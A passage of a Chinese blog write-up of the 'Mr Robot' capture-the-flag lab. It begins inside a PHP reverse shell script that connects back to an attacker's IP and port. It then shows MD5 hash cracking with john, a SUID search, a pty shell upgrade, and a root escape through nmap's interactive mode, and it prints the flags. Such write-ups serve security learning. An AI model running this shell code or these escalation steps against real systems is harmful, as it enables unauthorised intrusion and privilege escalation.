class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  <span class="hljs-comment">// stdin is a pipe that the child will read from</span><br>   <span class="hljs-number">1</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  <span class="hljs-comment">// stdout is a pipe that the child will write to</span><br>   <span class="hljs-number">2</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   <span class="hljs-comment">// stderr is a pipe that the child will write to</span><br>);<br><br><span class="hljs-variable">$process</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$process</span>)) &#123;<br>	<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br>	<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">stream_set_blocking</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$sock</span>)) &#123;<br>		<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>])) &#123;<br>		<span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	<span class="hljs-variable">$read_a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br>	<span class="hljs-variable">$num_changed_sockets</span> = <span class="hljs-title function_ invoke__">stream_select</span>(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, <span class="hljs-literal">null</span>);<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br>		<span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;SOCK: <span class="hljs-subst">$input</span>&quot;</span>);<br>		<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>], <span class="hljs-variable">$input</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br>		<span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$chunk_size</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDOUT: <span class="hljs-subst">$input</span>&quot;</span>);<br>		<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$read_a</span>)) &#123;<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br>		<span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>], <span class="hljs-variable">$chunk_size</span>);<br>		<span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) <span class="hljs-title function_ invoke__">printit</span>(<span class="hljs-string">&quot;STDERR: <span class="hljs-subst">$input</span>&quot;</span>);<br>		<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$sock</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">2</span>]);<br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printit</span> (<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br>		<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;<span class="hljs-subst">$string</span>\n&quot;</span>;<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>本地看端口，网页访问/404</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /home<br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br>robot <br><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> robot<br><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br>key<span class="hljs-literal">-2-of-3</span>.txt<br>password.raw<span class="hljs-literal">-md5</span><br></code></pre></td></tr></table></figure>
+<p>没有权限</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> whoami<br>daemon<br><span class="hljs-variable">$</span> sudo <span class="hljs-literal">-l</span><br>sudo: no tty present and no askpass program specified<br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span> <span class="hljs-literal">-al</span><br>total <span class="hljs-number">16</span><br>drwxr<span class="hljs-literal">-xr-x</span> <span class="hljs-number">2</span> root  root  <span class="hljs-number">4096</span> Nov <span class="hljs-number">13</span>  <span class="hljs-number">2015</span> .<br>drwxr<span class="hljs-literal">-xr-x</span> <span class="hljs-number">3</span> root  root  <span class="hljs-number">4096</span> Nov <span class="hljs-number">13</span>  <span class="hljs-number">2015</span> ..<br><span class="hljs-literal">-r--------</span> <span class="hljs-number">1</span> robot robot   <span class="hljs-number">33</span> Nov <span class="hljs-number">13</span>  <span class="hljs-number">2015</span> key<span class="hljs-literal">-2-of-3</span>.txt<br><span class="hljs-literal">-rw-r--r--</span> <span class="hljs-number">1</span> robot robot   <span class="hljs-number">39</span> Nov <span class="hljs-number">13</span>  <span class="hljs-number">2015</span> password.raw<span class="hljs-literal">-md5</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> password.raw<span class="hljs-literal">-md5</span><br>robot:c3fcd3d76192e4007dfb496cca67e13b<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿Coyano)-[~]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;c3fcd3d76192e4007dfb496cca67e13b&#x27;</span> &gt; hash.txt<br><br>┌──(root㉿Coyano)-[~]<br>└─# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (Raw-MD5 [MD5 512/512 AVX512BW 16x3])<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=32<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>abcdefghijklmnopqrstuvwxyz (?)<br>1g 0:00:00:00 DONE (2025-01-21 22:32) 100.0g/s 4070Kp/s 4070Kc/s 4070KC/s power12..telcel<br>Use the <span class="hljs-string">&quot;--show --format=Raw-MD5&quot;</span> options to display all of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure>
+<p>因此得到</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">username: robot<br>password: abcdefghijklmnopqrstuvwxyz<br></code></pre></td></tr></table></figure>
+<p>命令 <code>find / -perm -4000 2&gt;/dev/null</code> 用于在 Linux 或类 Unix 系统上查找所有具有 <strong>setuid</strong> 权限的可执行文件。<code>setuid</code> 权限允许用户以文件所有者的权限执行该文件，而不是以文件本身的权限执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ find / -perm -4000 2&gt;/dev/null<br>/bin/ping<br>/bin/umount<br>/bin/mount<br>/bin/ping6<br>/bin/su<br>/usr/bin/passwd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/gpasswd<br>/usr/bin/sudo<br>/usr/local/bin/nmap<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/pt_chown<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ su<br>su: must be run from a terminal<br></code></pre></td></tr></table></figure>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; 是一个常用的 Python 命令，用于在受限的环境中通过 Python 脚本启动一个交互式 shell，通常用于反向 shell 或突破一些限制环境（如通过 SSH 登录到目标系统时）<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">daemon@linux:/home/robot$ su robot<br>su robot<br>Password: abcdefghijklmnopqrstuvwxyz<br>robot@linux:~$ <span class="hljs-built_in">cat</span> key-2-of-3.txt<br><span class="hljs-built_in">cat</span> key-2-of-3.txt<br>822c73956184f694993bede3eb39f959<br></code></pre></td></tr></table></figure>
+<h2 id="what-is-key-3"><a class="markdownIt-Anchor" href="#what-is-key-3"></a> What is key 3?</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">robot@linux:/$ find / -perm -4000 2&gt;/dev/null<br>find / -perm -4000 2&gt;/dev/null<br>/bin/ping<br>/bin/umount<br>/bin/mount<br>/bin/ping6<br>/bin/su<br>/usr/bin/passwd<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/gpasswd<br>/usr/bin/sudo<br>/usr/local/bin/nmap<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/pt_chown<br></code></pre></td></tr></table></figure>
+<p>看看nmap有什么作用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">robot@linux:/usr/local/bin$ nmap --interactive<br>nmap --interactive<br><br>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )<br>Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )<br>Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span><br>nmap&gt; ！<span class="hljs-built_in">ls</span><br>！<span class="hljs-built_in">ls</span><br>Unknown <span class="hljs-built_in">command</span> (！<span class="hljs-built_in">ls</span>) -- press h &lt;enter&gt; <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span><br>nmap&gt; !<span class="hljs-built_in">ls</span><br>!<span class="hljs-built_in">ls</span><br>nmap<br>waiting to reap child : No child processes<br>nmap&gt; !root<br>!root<br>sh: 1: root: not found<br>waiting to reap child : No child processes<br>nmap&gt; !<span class="hljs-built_in">ls</span> /root<br>!<span class="hljs-built_in">ls</span> /root<br>firstboot_done  key-3-of-3.txt<br>waiting to reap child : No child processes<br>nmap&gt; !<span class="hljs-built_in">cat</span> /root/key-3-of-3.txt<br>!<span class="hljs-built_in">cat</span> /root/key-3-of-3.txt<br>04787ddef27c3dee1ee161b21670b4e4<br>waiting to reap child : No child processes<br></code></pre></td></tr></table></figure>
+<p>老版本的<code>nmap --internative</code>可以交互读取，类似可以参照vim。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83/" class="print-no-link">#提权</a>
+      
+        <a href="/tags/wordpress/" class="print-no-link">#wordpress</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>THM-Mr Robot CTF</div>
+      <div>https://0ran9ewww.github.io/2025/01/21/渗透/Mr Robot CTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月21日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年1月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/19/%E6%98%A5%E7%A7%8B%E6%9D%AF/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2025/" title="春秋杯冬季赛2025">
+                        <span class="hidden-mobile">春秋杯冬季赛2025</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
